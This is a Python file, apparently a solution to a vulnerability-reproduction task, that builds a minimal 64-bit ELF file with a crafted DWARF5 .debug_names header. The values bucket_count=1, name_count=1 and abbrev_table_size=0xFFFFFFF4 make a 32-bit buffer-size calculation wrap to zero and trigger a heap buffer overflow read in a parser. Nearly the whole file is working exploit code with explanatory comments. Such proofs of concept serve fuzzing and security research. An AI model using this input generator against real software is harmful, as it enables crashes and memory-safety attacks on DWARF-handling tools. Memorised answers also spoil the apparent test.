import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        The vulnerability is an integer overflow in the calculation of a buffer size
        when parsing the DWARF5 .debug_names section. By crafting a header with
        specific values for `bucket_count`, `name_count`, and `abbrev_table_size`,
        the calculation `bucket_count * 4 + name_count * 8 + abbrev_table_size`
        wraps around a 32-bit unsigned integer to 0.

        The library then allocates a 0-sized buffer but proceeds to access it,
        leading to a heap buffer overflow read.

        The PoC is a minimal 64-bit ELF file containing the malicious
        .debug_names section.
        """

        elf_header_size = 64
        sht_offset = elf_header_size
        sht_entry_size = 64
        sht_num_entries = 3
        sht_size = sht_num_entries * sht_entry_size

        shstrtab_offset = sht_offset + sht_size
        shstrtab_content = b'\x00.shstrtab\x00.debug_names\x00'
        shstrtab_size = len(shstrtab_content)

        debug_names_offset = shstrtab_offset + shstrtab_size
        debug_names_size = 36

        # --- ELF Header (64-bit) ---
        e_ident = b'\x7fELF\x02\x01\x01' + b'\x00' * 9
        elf_header = e_ident
        elf_header += struct.pack('<HHI', 2, 62, 1)  # ET_EXEC, EM_X86_64, EV_CURRENT
        elf_header += struct.pack('<QQQ', 0, 0, sht_offset)  # e_entry, e_phoff, e_shoff
        elf_header += struct.pack('<IHHHHHH',
                                 0, elf_header_size, 0, 0,
                                 sht_entry_size, sht_num_entries, 1)  # flags, ehsize, etc.

        # --- Section Header Table ---
        sht = b''
        # NULL Section Entry
        sht += b'\x00' * sht_entry_size

        # .shstrtab Section Entry
        sh_name_shstrtab = 1  # Offset of ".shstrtab" in shstrtab_content
        sht += struct.pack('<IIQQQQIIQQ',
                           sh_name_shstrtab, 3, 0, 0,  # name, type, flags, addr
                           shstrtab_offset, shstrtab_size, 0, 0, 1, 0) # offset, size, etc.

        # .debug_names Section Entry
        sh_name_debug_names = 11  # Offset of ".debug_names" in shstrtab_content
        sht += struct.pack('<IIQQQQIIQQ',
                           sh_name_debug_names, 1, 0, 0, # name, type, flags, addr
                           debug_names_offset, debug_names_size, 0, 0, 1, 0) # offset, size, etc.

        # --- .debug_names Header ---
        # Values chosen to cause integer overflow:
        # 1*4 + 1*8 + 0xFFFFFFF4 = 0x100000000 -> wraps to 0 in 32-bit unsigned
        bucket_count = 1
        name_count = 1
        abbrev_table_size = 0xFFFFFFF4
        augmentation_string_size = 1

        # The total size of the .debug_names section content is just the header.
        # unit_length is this total size minus the size of the unit_length field itself.
        unit_length = debug_names_size - 4

        debug_names_content = struct.pack(
            '<IHHIIIIIII',
            unit_length,
            5,                      # version (DWARF5)
            0,                      # padding
            1,                      # cu_count
            0,                      # local_tu_count
            0,                      # foreign_tu_count
            bucket_count,
            name_count,
            abbrev_table_size,
            augmentation_string_size
        )

        # --- Assemble the final PoC file ---
        poc = bytearray()
        poc.extend(elf_header)
        poc.extend(sht)
        
        # Pad to the start of the first section's content
        if len(poc) < shstrtab_offset:
            poc.extend(b'\x00' * (shstrtab_offset - len(poc)))
        poc.extend(shstrtab_content)
        
        # Pad to the start of the next section's content
        if len(poc) < debug_names_offset:
            poc.extend(b'\x00' * (debug_names_offset - len(poc)))
        poc.extend(debug_names_content)

        return bytes(poc)